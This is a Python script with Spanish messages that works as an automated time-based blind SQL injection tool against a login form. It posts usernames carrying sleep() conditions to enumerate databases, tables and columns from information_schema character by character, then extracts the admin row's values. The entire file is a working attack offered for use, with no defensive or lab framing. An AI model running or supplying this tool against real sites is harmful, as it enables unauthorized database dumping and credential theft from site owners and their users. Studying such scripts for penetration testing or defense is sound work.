#Realizada por 
#████████╗██████╗░██████╗░░█████╗░███████╗
#╚══██╔══╝██╔══██╗╚════██╗██╔══██╗██╔════╝
#░░░██║░░░██████╔╝░█████╔╝██║░░╚═╝█████╗░░
#░░░██║░░░██╔══██╗░╚═══██╗██║░░██╗██╔══╝░░
#░░░██║░░░██║░░██║██████╔╝╚█████╔╝███████╗
#░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░░╚════╝░╚══════╝


from pwn import *
import requests, time, sys, string, signal

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
characters = string.ascii_lowercase + string.digits + "-_"

def get_login_url():
    return input("Introduce la URL de login: ")

def sqli(login_url):
    databases = []
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Databases")

    for db in range(0, 20):
        database = ""
        for position in range(1, 25):
            found = False
            for character in characters:
                post_data = {
                    'username': "admin' and if(substr((select schema_name from information_schema.schemata limit %d,1),%d,1)='%s', sleep(1), 1)-- -" % (db, position, character),
                    'password': 'admin'
                }

                p1.status(post_data['username'])

                time_start = time.time()

                r = requests.post(login_url, data=post_data)

                time_end = time.time()

                if time_end - time_start > 1:
                    database += character
                    p2.status(database)
                    found = True
                    break
            
            if not found:
                break

        if database:
            databases.append(database)
        else:
            break

    return databases

def sqlitables(login_url, database):
    tables = []
    p3 = log.progress("Fuerza Bruta")
    p3.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p4 = log.progress("Tables")

    for table_index in range(0, 20):
        table = ""
        for position in range(1, 20):
            found = False
            for character in characters:
                post_data = {
                    'username': "admin' and if(substr((select table_name from information_schema.tables where table_schema='%s' limit %d,1),%d,1)='%s', sleep(1), 1)-- -" % (database, table_index, position, character),
                    'password': 'admin'
                }

                p3.status(post_data['username'])

                time_start = time.time()

                r = requests.post(login_url, data=post_data)

                time_end = time.time()

                if time_end - time_start > 1:
                    table += character
                    p4.status(table)
                    found = True
                    break
            
            if not found:
                break

        if table:
            tables.append(table)
        else:
            break

    return tables

def sqlicolumns(login_url, database, table):
    columns = []
    p5 = log.progress("Fuerza Bruta")
    p5.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p6 = log.progress("Columns")

    for column_index in range(0, 20):
        column = ""
        for position in range(1, 20):
            found = False
            for character in characters:
                post_data = {
                    'username': "admin' and if(substr((select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit %d,1),%d,1)='%s', sleep(1), 1)-- -" % (database, table, column_index, position, character),
                    'password': 'admin'
                }

                p5.status(post_data['username'])

                time_start = time.time()

                r = requests.post(login_url, data=post_data)

                time_end = time.time()

                if time_end - time_start > 1:
                    column += character
                    p6.status(column)
                    found = True
                    break
            
            if not found:
                break

        if column:
            columns.append(column)
        else:
            break

    return columns

def sqlidata(login_url, database, table, columns):
    data = []
    p7 = log.progress("Fuerza Bruta")
    p7.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p8 = log.progress("Data")

    for column in columns:
        value = ""
        for position in range(1, 35):
            found = False
            for character in characters:
                post_data = {
                    'username': "admin' and if(substr((select %s from %s where username='admin'),%d,1)='%s', sleep(1), 1)-- -" % (column, table, position, character),
                    'password': 'admin'
                }

                p7.status(post_data['username'])

                time_start = time.time()

                r = requests.post(login_url, data=post_data)

                time_end = time.time()

                if time_end - time_start > 1:
                    value += character
                    p8.status(value)
                    found = True
                    break
            
            if not found:
                break

        data.append((column, value))
    return data

if __name__ == '__main__':
    login_url = get_login_url()
    databases = sqli(login_url)
    
    print("\nBases de datos encontradas:")
    for i, db in enumerate(databases):
        print(f"{i}: {db}")
    
    db_index = int(input("\nSelecciona el Ã­ndice de la base de datos: "))
    selected_db = databases[db_index]

    tables = sqlitables(login_url, selected_db)
    
    print("\nTablas encontradas:")
    for i, table in enumerate(tables):
        print(f"{i}: {table}")
    
    table_index = int(input("\nSelecciona el Ã­ndice de la tabla: "))
    selected_table = tables[table_index]

    columns = sqlicolumns(login_url, selected_db, selected_table)
    
    print("\nColumnas encontradas:")
    for i, column in enumerate(columns):
        print(f"{i}: {column}")
    
    column_selection = input("\nSelecciona los Ã­ndices de las columnas separados por coma (o escribe 'all' para todas): ")

    if column_selection.lower() == 'all':
        selected_columns = columns
    else:
        indices = map(int, column_selection.split(','))
        selected_columns = [columns[i] for i in indices]

    data = sqlidata(login_url, selected_db, selected_table, selected_columns)
    
    print("\nDatos recuperados:")
    for column, value in data:
        print(f"{column}: {value}")